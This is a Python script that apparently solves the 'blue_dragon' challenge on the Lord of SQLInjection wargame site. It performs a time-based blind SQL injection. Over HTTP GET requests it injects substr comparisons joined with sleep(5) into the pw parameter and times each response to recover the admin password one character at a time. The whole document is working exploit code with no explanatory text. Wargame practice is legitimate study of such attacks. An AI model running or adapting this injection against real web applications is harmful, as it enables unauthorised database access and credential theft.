import requests
import string
import time


pw=""
a=string.printable
a=a[:-38]
url = "https://los.rubiya.kr/chall/blue_dragon_23f2e3c81dca66e496c7de2d63b82984.php"
cookies = {'PHPSESSID':'cookie'}
for i in range(1,9):
    for j in a:
        url="https://los.rubiya.kr/chall/blue_dragon_23f2e3c81dca66e496c7de2d63b82984.php?id=admin&pw=%27or%20substr(pw,"+str(i)+",1)=\""+str(j)+"\"%20and%20sleep(5)--%20-"
        starttime = time.time()
        res = requests.get(url,cookies=cookies)
        endtime = time.time()
        res = res.text
        if endtime-starttime>4:
            pw+=j
            print(pw)
            break
        else: 
            pass